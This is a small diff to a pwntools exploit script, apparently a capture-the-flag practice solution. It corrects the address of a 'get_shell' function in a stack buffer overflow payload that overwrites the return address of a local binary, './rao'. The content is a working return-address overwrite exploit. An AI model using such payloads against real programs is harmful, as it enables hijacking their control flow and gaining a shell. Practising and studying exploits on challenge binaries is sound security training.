@@ -4,7 +4,7 @@
 from pwn import *
 
 p = process("./rao")
-get_shell = 0x4005
+get_shell = 0x4005a7
 payload = b"A"*0x30
 payload += b"B"*0x8
 payload += p64(get_shell)
